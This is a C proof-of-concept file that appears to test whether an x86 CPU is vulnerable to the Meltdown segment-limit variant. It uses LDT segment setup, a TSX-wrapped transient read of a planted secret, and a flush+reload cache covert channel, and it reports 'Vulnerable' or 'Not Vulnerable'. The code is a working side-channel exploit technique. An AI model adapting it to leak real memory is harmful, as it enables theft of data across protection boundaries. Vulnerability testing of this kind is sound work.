#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/types.h>
#include <asm/ldt.h>

#include "libcache/cache.h"
#include "lib/global.h"

#define SEGMENT "es"
#define DO_SEG_FAIL 1

char mem2[4096 * 256];

char __attribute__((aligned(0x1000))) secret = 'S';
char __attribute__((aligned(0x1000))) dummy;
unsigned status;

struct user_desc my_desc_ok = {
    .entry_number = 0,
    .base_addr = 0x0,
    .limit = 0xFFFFFF,
    .seg_32bit = 0x1,
    .contents = MODIFY_LDT_CONTENTS_DATA,
    .read_exec_only = 0x0,
    .limit_in_pages = 0x1,
    .seg_not_present = 0x0,
    .useable = 0x1};

struct user_desc my_desc_fail = {
    .entry_number = 1,
    .base_addr = 0x0,
    .limit = 0x1,
    .seg_32bit = 0x1,
    .contents = MODIFY_LDT_CONTENTS_DATA,
    .read_exec_only = 0x0,
    .limit_in_pages = 0x1,
    .seg_not_present = 0x0,
    .useable = 0x1};

void inline __attribute__((always_inline)) seg_ok(void)
{
    asm("mov $0x7, %%eax\n\t" /* 0111: 0=idx, 1=LDT, 11=CPL */
        "mov %%eax, %%" SEGMENT "\n\t" ::
            : "eax");
}

void inline __attribute__((always_inline)) seg_fail(void)
{
    asm("mov $0xf, %%eax\n\t" /* 0111: 1=idx, 1=LDT, 11=CPL */
        "mov %%eax, %%" SEGMENT "\n\t" ::
            : "eax");
}

int main(int argc, char **argv)
{
    if (argc != 4)
    {
        printf("Usage\t: ./poc_* [pagesize] [threshold] [timeout]\nExample\t: ./poc_x86 4096 200 120\n");
        return 0;
    }
    sscanf(argv[1], "%d", &pagesize);
    sscanf(argv[2], "%d", &CACHE_MISS);
    sscanf(argv[3], "%ld", &timeout);
    timeout *= CLOCKS_PER_SEC;
    int passed_count = 0;
    if (syscall(__NR_modify_ldt, 1, &my_desc_ok, sizeof(struct user_desc)))
        exit(EXIT_FAILURE);

    if (syscall(__NR_modify_ldt, 1, &my_desc_fail, sizeof(struct user_desc)))
        exit(EXIT_FAILURE);

    memset(mem2, 1, sizeof(mem2));
    int i;
    // Flush our shared memory
    for (i = 0; i < 256; i++)
    {
        flush(mem2 + i * 4096);
    }
    start_time = time(NULL);
    for (int r = 0; r < MAX_TRY_TIMES; r++)
    {
        // Ensure data is in the cache
        maccess(&secret);
#if DO_SEG_FAIL
        seg_fail();
#endif
        // tsx begin
        if (try_start())
        {
            // Encode in the cache
            asm("mov dummy, %%ebx\n\t"
                "mov %%" SEGMENT ":secret, %%eax\n\t"
                "shl $0xc, %%eax\n\t"
                "mov (%0, %%eax), %%eax\n\t" ::"c"(mem2)
                : "eax", "ebx");

            // tsx end
            try_abort();
        }
        try_end();
        seg_ok();

        // Recover data from the covert channel
        for (i = 1; i < 256; i++)
        {
            if (flush_reload(mem2 + i * 4096))
            {
                break;
            }
        }
        if (i == 'S')
        {
            passed_count++;
        }
        if (time(NULL) - start_time > timeout)
        {
            printf(ANSI_COLOR_YELLOW "Meltdown_SS: Timeout" ANSI_COLOR_RESET "\n");
            exit(-1);
        }
        flush(&dummy);
    }
    int exit_result = 0;
    if ((double)passed_count / MAX_TRY_TIMES > 0.3)
    {
        printf(ANSI_COLOR_RED "Meltdown_SS: Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_SUCCESS;
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Meltdown_SS: Not Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_FAILURE;
    }
    exit(exit_result);
}